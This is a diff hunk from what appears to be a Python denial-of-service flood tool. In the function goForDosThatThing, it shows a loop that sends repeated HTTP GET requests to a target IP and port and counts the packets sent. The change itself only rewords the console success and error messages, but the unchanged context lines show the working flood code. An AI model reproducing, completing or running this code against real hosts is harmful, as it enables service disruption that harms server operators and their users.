@@ -58,14 +58,14 @@ def goForDosThatThing():
                     try:
                         dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                         dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
-                        print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "-----< PACKET " + ConsoleColors.FAIL + str(Count.packetCounter) + ConsoleColors.OKGREEN + " SUCCESSFUL SENT AT: " + ConsoleColors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + ConsoleColors.OKGREEN + " >-----")
+                        print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "Sent the packet" + ConsoleColors.FAIL + str(Count.packetCounter) + ConsoleColors.OKGREEN + "successful: " + ConsoleColors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + ConsoleColors.OKGREEN + "> ")
                         Count.packetCounter = Count.packetCounter + 1
                     except socket.error:
                         print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
                     except KeyboardInterrupt:
                         print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
             except socket.error:
-                print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
+                print(ConsoleColors.WARNING + "Server error, Please check the host!")
             except KeyboardInterrupt:
                 print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
             dosSocket.close()
